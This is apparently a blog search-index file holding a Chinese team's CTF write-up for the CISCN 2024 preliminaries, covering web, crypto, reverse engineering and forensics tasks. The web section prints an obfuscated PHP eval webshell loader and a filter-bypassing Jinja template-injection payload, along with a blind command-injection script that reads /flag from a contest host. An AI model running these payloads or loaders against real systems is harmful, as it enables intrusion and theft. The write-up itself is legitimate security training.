<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ciscn&amp;ccb2024初赛</title>
    <link href="/2024/12/15/ciscn/ciscn&amp;ccb2024/"/>
    <url>/2024/12/15/ciscn/ciscn&amp;ccb2024/</url>
    
    <content type="html"><![CDATA[<p>为团队的wp，最后排名为218,浙江赛区57，最近要复习考试，直接cp上来了，感谢队友的付出。</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="hello_web"><a class="markdownIt-Anchor" href="#hello_web"></a> hello_web</h2><p>对<code>hackme.php</code>进行二次目录穿越得到源码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?file=....//hackme.php<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$lJbGIY</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<span class="hljs-variable">$OlWYMv</span>=<span class="hljs-string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<br><span class="hljs-variable">$lapUCm</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br><span class="hljs-variable">$YwzIst</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<br><span class="hljs-variable">$OxirhK</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$YpAUWC</span>=<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$rVkKjU</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">13</span>&#125;;<span class="hljs-variable">$YwzIst</span>.=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">36</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$YwzIst</span>(<span class="hljs-string">&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;</span>));<br><span class="hljs-variable">$uWcdaA</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox==&quot;</span>;<br><br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$YwzIst</span>(<span class="hljs-variable">$OxirhK</span>(<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>,<span class="hljs-variable">$rVkKjU</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$rVkKjU</span>))));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简单的解密调整一下</p><p><img src="/../../images/ciscn/2025/2024-12-15124453.png" alt="2024-12-15124453"></p><p>得到一个一句话，蚁剑直接连拿到shell</p><p>里面慢慢找</p><p><img src="/../../images/ciscn/2025/2024-12-15212842.png" alt="2024-12-15212842"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">6</span>baf34cf-<span class="hljs-number">5061</span>-<span class="hljs-number">48</span>c5-<span class="hljs-number">967</span>a-<span class="hljs-number">64</span>bcec7d12cf&#125;<br></code></pre></td></tr></table></figure><h2 id="safe_proxy"><a class="markdownIt-Anchor" href="#safe_proxy"></a> Safe_Proxy</h2><p>过滤了 __ import  等 没有过滤引号和中括号其实都⽆所谓 ⽤拼接都可以搞定</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;&#123;lipsum[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_glo&#x27;</span><span class="hljs-string">&#x27;bals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;o&#x27;</span><span class="hljs-string">&#x27;s&#x27;</span>][<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><p>.、⽆回显，不出网，用盲注<code> cut -c 1 /flag |grep -q '^f' &amp;&amp; sleep</code></p><p>判断第一个字符是否为f</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <span class="hljs-keyword">import</span> time<br> <span class="hljs-keyword">import</span> string<br> <span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> Timeout<br> <span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;1234567890abcdefgl&#123;&#125;-&quot;</span><br> flag=<span class="hljs-string">&quot;&quot;</span><br> burp0_url = <span class="hljs-string">&quot;http://101.200.33.218:20500&quot;</span><br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br> <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br> start = time.time()<br> burp0_data = &#123;<br> <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;lipsum[&#x27;_&#x27;&#x27;_glo&#x27;+&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_bui&#x27;+&#x27;ltins_&#x27;&#x27;_&#x27;]</span><br><span class="hljs-string"> [&#x27;_&#x27;&#x27;_imp&#x27;+&#x27;ort_&#x27;&#x27;_&#x27;](&#x27;o&#x27;+&#x27;s&#x27;)[&#x27;pop&#x27;+&#x27;en&#x27;](request.values.a)[&#x27;read&#x27;]()&#125;&#125;&quot;</span>,<br> <span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-string">f&quot;cut -c <span class="hljs-subst">&#123;i&#125;</span> /flag |grep -q &#x27;^<span class="hljs-subst">&#123;n&#125;</span>&#x27; &amp;&amp; sleep 1&quot;</span>&#125;<br> <span class="hljs-built_in">print</span>(burp0_data)<br> s=time.time()<br> r=requests.post(burp0_url,burp0_data)<br> z=time.time()<br> e=z-s<br> <span class="hljs-comment">#print(e)</span><br> <span class="hljs-keyword">if</span> e &gt;<span class="hljs-number">2</span>:<br> flag = flag + n<br> <span class="hljs-built_in">print</span>(flag)<br> <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>进行盲注得到flag</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="rasnd"><a class="markdownIt-Anchor" href="#rasnd"></a> rasnd</h2><p>根据给出的 <code>hint1</code> 和 <code>hint2</code>，可以通过以下步骤解线性方程组来恢复 <code>p</code> 和 <code>q</code>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">hint1 = x1 * p + y1 * q - 0x114<br>hint2 = x2 * p + y2 * q - 0x514<br></code></pre></td></tr></table></figure><p>可以通过对方程组使用高斯消元法或者求解线性同余方程来得到 <code>p</code> 和 <code>q</code></p><p>之后正常运算可以得到第一部分的flag1</p><p>第二部分根据<code>hint = pow(514*p - 114*q, n - p - q, n)</code></p><p>使用 <code>sympy.symbols</code> 定义了符号 <code>p</code> 和 <code>q</code>，并使用 <code>sympy.solve</code> 解这个二次方程系统</p><p>最后上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br><br>n=<span class="hljs-number">15571456267986315488975723450356345087718335860973425041970526062930678688004877472726692863395333820715771568748899746804239389792324773568293400777592369432033399734229826101839405881858154686883562826168531586485886050368427196622050408747529737560948695189431114477125298155206637472981918243135167693202309064540922544817772421677213516681938382724861247526776919418570681370914319059765208725653435286286369262432432738585115819967126015242864913276779548384773368888797638794486637029828926014322758088067062520338563751174949660352641832306723543679983405536001018373066819012751957373602270491261781943692451</span><br>c=<span class="hljs-number">10138159256617683671344371395383684051460639588039456122325582895268006024549438120246385926787371141878966286026141627264126118315244479763745981575785395672281132108975400831181100543899707558636529802723530981072916480954510365398900664845121793225380216608977152511584554076316206842663320464522427711864146084967671778711501213500811448393308352054539481554472015482310490001587379613563243102825960886944440637550704993295302474930860549369906857984817998884327137825810988790815501164876274709874835804927744396044745242295778821526054765192646642691216550898413138608168464057274447288498347809508391874078150</span><br>hint1=<span class="hljs-number">1113527763851290635928054349628822672712406038367490409391989362204138038707491353066059662457399240222604310120418974560896417378634356219401939936772013139208736144240188110954774381034869540545991209553704416040566662192133639921119681380540151370140950225855384990639360874116246929526335724393709704555523397061113330986308841161704834262</span><br>hint2=<span class="hljs-number">469145226081975102962707185744965418652551771390251982857238564862954592116851382039187942830551376694597289784973911249420303012543547700451423671709885139971507599078588448467028804611757858225001254126217370283415795283632126975858507813863309002905812901139852730404269024645020684848348269606634111739435265103863588056568400805000368719594936497885834095554649750685271716303431151114077043445646815264749604414760396794054063488358276670477132717547675321</span><br>e = <span class="hljs-number">0x10001</span><br><span class="hljs-comment"># for x in range(2**11):</span><br><span class="hljs-comment">#     for y in range(2**11):</span><br><span class="hljs-comment">#         ans=y*(hint1+0x114)-x*(hint2+0x514)</span><br><span class="hljs-comment">#         p=GCD(ans,n)</span><br><span class="hljs-comment">#         if p.bit_length()==1024:</span><br><span class="hljs-comment">#             print(p)</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#算出p</span><br>p=<span class="hljs-number">151741449960602674181569548778219268574805684003292009805579666410744061961373812541212384620302855757363584237178778709542180869569625693820045588037555520865515482079040715280747528266802005016049156365506475387927030507693557409190538210793353752981314744388403447028332106171553391017704103813637740862483</span><br>q=n//p<br>d=inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m1=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m1))<br><br>n=<span class="hljs-number">9523124278093384380137333796758753281078612236079561486983945889780721207303549023303024440841627286405083125348744572351407091836171529244116187461606526665489207688519350470776636227195291535792285788312129885484606054185703618606874074966991041342400017839018587051618282195708479456873682987062969979049686487019441267029672031951160292394756827410978399983038083933308302196554964247040939791805560327993003047235997533659068506554360092592221284392413413594396846796603833878975931951996578980236630697909533117075044941085923033995318733990040988578726539657031652194674795368301571263954308236125072336742923</span><br>c=<span class="hljs-number">5273734494284054855490964797863549169365387814218439735266313777477824453168799965307592110444580631054190027479890646137568318684109204541297014987016330040377681900747865115463362762227883757575533147626609621563389383184624472025300729208542931331787962981165071651576701100539444726312887872996143702786937863406051088668813351236789364969646856084064479216203639171930681218044535160987239658126771711615002965807383203174258609586140600267661785003086555740614073305327903630154724987132488332825809842362149617410125406472752794473443433328002891445187606767643851176181189236584321291501946747955450825337033</span><br>hint=<span class="hljs-number">1052848157151138296179828680888309290261479029245209315287220839177795554990470575133261126960559387010458830758081463546363724848842523816860646275667995619135052897345272796475886486666463671774915373269700438043172153452449283423126701065539997463346668816755324361359119216062088420688050942800819547385579126190005910615363484848310083718699134226164273364002263958376395926755573872333534644445031958615742294082987515753336608958799143473898769727849924237694896994812906095295678572804928722865686728618259328243136774940336395674340740682322309070700712820608390084140662856314659282525733874060310943099081</span><br>x=inverse(hint,n)<br>p,q=sympy.symbols(<span class="hljs-string">&#x27;p q&#x27;</span>)<br>f1=p*q-n<br>f2=<span class="hljs-number">514</span>*p-<span class="hljs-number">114</span>*q-x<br>result=sympy.solve([f1,f2],[p,q])<br><span class="hljs-built_in">print</span>(result)<br><br>p=<span class="hljs-number">103559096099649916097603875438251576043876012092267214914368235618133473407356412345986965585985305784772503201577573675950002938623693666053281855135481077032093277321146517906332643773867157427273131714270750558193445453250839897965711273142676548868317141772599118150907904766529213031946296536674546180681</span><br>q=<span class="hljs-number">91958356501390682961351906577181171330031315784376936623805197777515493865196381556112411554260456210547139323494708970744923880488405569381440989350001420970905191346462257978335032428913780454285094938132336821895985702324445944779854726782432741869179012526792766331985471472521593687648140582262858754483</span><br>d=inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m2=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m2))<br><span class="hljs-comment">#拼接flag</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m1)+long_to_bytes(m2))<br></code></pre></td></tr></table></figure><h1 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h1><h2 id="dump"><a class="markdownIt-Anchor" href="#dump"></a> dump</h2><p>是一下发现编码对应字符</p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202412151750617.png" alt="image-20241215152327252"></p><p>生成一个对应表，手撸写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;02030405060708090a0b0c0d0e0f101112131415161718191a1b1e1f202122232425262728292a2b2c2d2e2f30313233343536371c1d3839&quot;</span><br>b=<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz12&#123;&#125;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(b)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-built_in">print</span>(b[i],a[<span class="hljs-number">2</span>*i:<span class="hljs-number">2</span>*i+<span class="hljs-number">2</span>])<br><br><span class="hljs-comment">#23291e24380e1520370e0520000e37121d0f24010139</span><br><span class="hljs-comment">#flag&#123;MTczMDc4MzQ2Ng==&#125;</span><br></code></pre></td></tr></table></figure><p>（我自己没事也搓了一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>char_dict = string.ascii_letters + string.digits+<span class="hljs-string">&quot;=&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span><br>key_dict = <span class="hljs-string">&#x27;1e1f202122232425262728292a2b2c2d2e2f303132333435363702030405060708090a0b0c0d0e0f101112131415161718191a1b001c1d00000000000000013839&#x27;</span><br><br>mapping = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(char_dict)):<br>    char = char_dict[i]<br>    key = key_dict[i*<span class="hljs-number">2</span>:i*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>]<br>    mapping[key] = char<br><br>ans = <span class="hljs-string">&#x27;23291E24380E1520370E0520000E37121D0F24010139&#x27;</span><br>ans = ans.lower()<br>decoded_message = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ans) // <span class="hljs-number">2</span>):<br>    key = ans[i * <span class="hljs-number">2</span>:i * <span class="hljs-number">2</span> + <span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> mapping:<br>        decoded_message += mapping[key]<br><br><span class="hljs-built_in">print</span>(decoded_message)<br><span class="hljs-comment">#第13位为4</span><br><span class="hljs-comment">#MTczMDc4MzQ2Ng==</span><br></code></pre></td></tr></table></figure><h2 id="ezcsky"><a class="markdownIt-Anchor" href="#ezcsky"></a> ezCsky</h2><p>猜一手rc4＋xor</p><p><img src="/../../images/ciscn/2025/2024-12-15213103.png" alt="2024-12-15213103"></p><p>enc</p><p><img src="/../../images/ciscn/2025/2024-12-15213147.png" alt="2024-12-15213147"></p><p>key</p><p><img src="/../../images/ciscn/2025/2024-12-15213232.png" alt="2024-12-15213232"></p><p>rc4一下，发现结尾是<code>&#125;</code></p><p><img src="/../../images/ciscn/2025/2024-12-15213305.png" alt="2024-12-15213305"></p><p>再往前异或，即flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">enc=[<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0x1f</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x1d</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x0c</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0x7d</span>]<br>length=<span class="hljs-built_in">len</span>(enc)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length-<span class="hljs-number">1</span>):<br>    enc[length-i-<span class="hljs-number">2</span>]^=enc[length-i-<span class="hljs-number">1</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="威胁检测与网络流量分析"><a class="markdownIt-Anchor" href="#威胁检测与网络流量分析"></a> 威胁检测与网络流量分析</h1><h2 id="zeroshell_1"><a class="markdownIt-Anchor" href="#zeroshell_1"></a> zeroshell_1</h2><p>搜一下base64加密的flag头</p><p><img src="/../../images/ciscn/2025/2024-12-15213719.png" alt="2024-12-15213719"></p><p><img src="/../../images/ciscn/2025/2024-12-15213725.png" alt="2024-12-15213725"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">flag&#123;6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A&#125;<br></code></pre></td></tr></table></figure><h2 id="zeroshell_2"><a class="markdownIt-Anchor" href="#zeroshell_2"></a> zeroshell_2</h2><p>CVE-2019-12715 zeroshell3.9.0 RCE</p><p>直接find / -name flag找到flag</p><p><img src="/../../images/ciscn/2025/image-20241215125126387.png" alt="image-20241215125126387"></p><p><img src="/../../images/ciscn/2025/image-20241215125148936.png" alt="image-20241215125148936"></p><p>或者livecd直接看</p><p><img src="/../../images/ciscn/2025/image-20241215130121966.png" alt="image-20241215130121966"></p><h2 id="zeroshell_3"><a class="markdownIt-Anchor" href="#zeroshell_3"></a> zeroshell_3</h2><p>netstat -ano一直循环执行可以发现内容会隔一段时间多出一段，发现是多出了一个进程，端口47000开始往后端口有规律的变化，提交此ip</p><p><img src="/../../images/ciscn/2025/image-20241215125635979.png" alt="image-20241215125635979"></p><h2 id="zeroshell_4"><a class="markdownIt-Anchor" href="#zeroshell_4"></a> zeroshell_4</h2><p>找了半天没找着，想起之前做的题会用.隐藏恶意文件，在几个目录下寻找后，最终在/tmp下找到.nginx，查看发现是ELF开头，怀疑是木马</p><p><img src="/../../images/ciscn/2025/image-20241215130121966.png" alt="image-20241215130121966"></p><h2 id="zeroshell_5"><a class="markdownIt-Anchor" href="#zeroshell_5"></a> zeroshell_5</h2><p>直接从机子里提出来IDA分析，或者直接DG，Shift+F12 转到ip连接的函数下面就是</p><p><img src="/../../images/ciscn/2025/image-20241215130034574.png" alt="image-20241215130034574"></p><p><img src="/../../images/ciscn/2025/image-20241215142331973.png" alt="image-20241215142331973"></p><h2 id="zeroshell_6"><a class="markdownIt-Anchor" href="#zeroshell_6"></a> zeroshell_6</h2><p>直接DG挂载虚拟磁盘，把数据掏出来上seay直接全局扫描.nginx</p><p><img src="/../../images/ciscn/2025/image-20241215160920031.png" alt="image-20241215160920031"></p><h2 id="winft_1"><a class="markdownIt-Anchor" href="#winft_1"></a> WinFT_1</h2><p>内存直接看出ip和恶意进程，记事本打开进程往下翻直接得到域名</p><p><img src="/../../images/ciscn/2025/image-20241215130311680.png" alt="image-20241215130311680"></p><p><img src="/../../images/ciscn/2025/image-20241215130447588.png" alt="image-20241215130447588"></p><h2 id="winft_2"><a class="markdownIt-Anchor" href="#winft_2"></a> WinFT_2</h2><p><img src="/../../images/ciscn/2025/image-20241215142004823.png" alt="image-20241215142004823"></p><p>取证大师取证发现添加了两条计划任务，时间逆序发现是powershell启动项，base64解密出flag</p><p><img src="/../../images/ciscn/2025/image-20241215142122659.png" alt="image-20241215142122659"></p><h2 id="winft_5"><a class="markdownIt-Anchor" href="#winft_5"></a> WinFT_5</h2><p>题目提示压缩包，直接http contains &quot;PK&quot;或者http contains “flag”</p><p><img src="/../../images/ciscn/2025/image-20241215163402160.png" alt="image-20241215163402160"></p><p>压缩包损坏是骗人的md，能直接解，以为要修修了半天，直接解带flag.txt的直接出</p><p><img src="/../../images/ciscn/2025/image-20241215163438840.png" alt="image-20241215163438840"></p><p>密码是base64解密的注释</p><p><img src="/../../images/ciscn/2025/image-20241215163305410.png" alt="image-20241215163305410"></p><p><img src="/../../images/ciscn/2025/image-20241215163325004.png" alt="image-20241215163325004"></p><h2 id="sc05_1"><a class="markdownIt-Anchor" href="#sc05_1"></a> sc05_1</h2><p><img src="/../../images/ciscn/2025/2024-12-15214209.png" alt="2024-12-15214209"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024强网杯青少赛初赛</title>
    <link href="/2024/11/26/%E5%BC%BA%E7%BD%91%E6%9D%AF/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E8%B5%9B%E5%88%9D%E8%B5%9B/"/>
    <url>/2024/11/26/%E5%BC%BA%E7%BD%91%E6%9D%AF/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E8%B5%9B%E5%88%9D%E8%B5%9B/</url>
    
